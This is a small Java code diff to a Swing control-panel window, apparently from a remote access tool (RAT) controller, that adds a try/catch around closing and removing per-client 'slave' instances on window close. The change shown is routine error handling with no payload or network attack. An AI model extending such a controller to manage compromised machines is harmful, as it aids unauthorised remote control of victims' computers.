@@ -132,8 +132,12 @@ public class FrameControlPanel extends BaseFrame {
 			@Override
 			public void windowClosing(WindowEvent arg0) {
 				for (RATControlMenuEntry entry : entries) {
-					entry.instances.get(slave.getIP()).onClose();
-					entry.instances.remove(slave.getIP());
+					try {
+						entry.instances.get(slave.getIP()).onClose();
+						entry.instances.remove(slave.getIP());
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
 				}
 			}
 		});
